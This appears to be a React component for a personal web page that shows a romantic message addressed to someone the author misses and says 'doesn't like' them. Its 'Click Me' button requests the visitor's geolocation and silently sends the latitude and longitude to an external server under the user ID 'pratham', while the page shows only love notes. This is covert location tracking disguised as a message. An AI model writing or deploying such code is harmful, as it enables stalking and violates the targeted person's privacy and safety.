import React, { useState } from "react";

const LocationSender = () => {
  const [status, setStatus] = useState("");
  const [coords, setCoords] = useState(null);

  const sendLocation = async (latitude, longitude) => {
    try {
      const res = await fetch("https://messageweb-njt9.onrender.com/location", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          userId: "pratham",
          latitude,
          longitude,
        }),
      });

      const data = await res.json();
      console.log("Server response:", data);
      setStatus("I Love You Bauua ❤️🥰");
    } catch (err) {
      console.error(err);
      setStatus("You did something wrong⚠");
    }
  };

  const handleSendLocation = () => {
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported by your browser");
      return;
    }

    setStatus("📍 Getting Started");

    navigator.geolocation.getCurrentPosition(
        (position) => {
            const { latitude, longitude } = position.coords;
            setCoords({ latitude, longitude });
            sendLocation(latitude, longitude);
        },
        (error) => {
            console.error(error);

            if (error.code === error.PERMISSION_DENIED) {
            setStatus("⚠️ You denied location. Please enable it in browser settings.");
            } else if (error.code === error.POSITION_UNAVAILABLE) {
            setStatus("❌ Location unavailable. Turn on GPS or check network.");
            } else if (error.code === error.TIMEOUT) {
            setStatus("⌛ Location request timed out. Try again.");
            } else {
            setStatus("❌ Unknown error getting location.");
            }
        }
    );
  };

  return (
    <div style={{ textAlign: "center", marginTop: "3rem" }}>
      <h1>I don't know why i still miss you suddenly you come into my mind and my mind goes blank remembering the time which i spended with you and a lot of things. Don't know you miss me or not but i still miss you sometimes i saw you in my dreams.</h1>
      <button
        onClick={handleSendLocation}
        style={{
          background: "#2563eb",
          color: "#fff",
          border: "none",
          padding: "10px 20px",
          borderRadius: "8px",
          cursor: "pointer",
          fontSize: "1rem",
        }}
      >
        Click Me
      </button>

      <p style={{ marginTop: "1rem" }}>{status}</p>

      {coords && (
        <div style={{ marginTop: "1rem" }}>
          <p>
            {/* <strong>Latitude:</strong> {coords.latitude} */}
            {coords.latitude && (
              <div>
  <h3 className="luv-title">I know you don't like me.</h3>

<p className="luv-sub">
  Whenever i think about you i don't know but you resemble to me like a little baby.
  I want you touch your cheeks and hair like a baby. There are alot of thing i miss when i think about you.
</p>


<div className="luv-small">
 I wish i could have marry you and can make you my wife.
</div>
</div>

)}
          </p>
          <p>
            {/* <strong>Longitude:</strong> {coords.longitude} */}
          </p>
          {/* <a
            href={`https://www.google.com/maps?q=${coords.latitude},${coords.longitude}`}
            target="_blank"
            rel="noreferrer"
          >
            🌍 View on Google Maps
          </a> */}
        </div>
      )}
    </div>
  );
};

export default LocationSender;
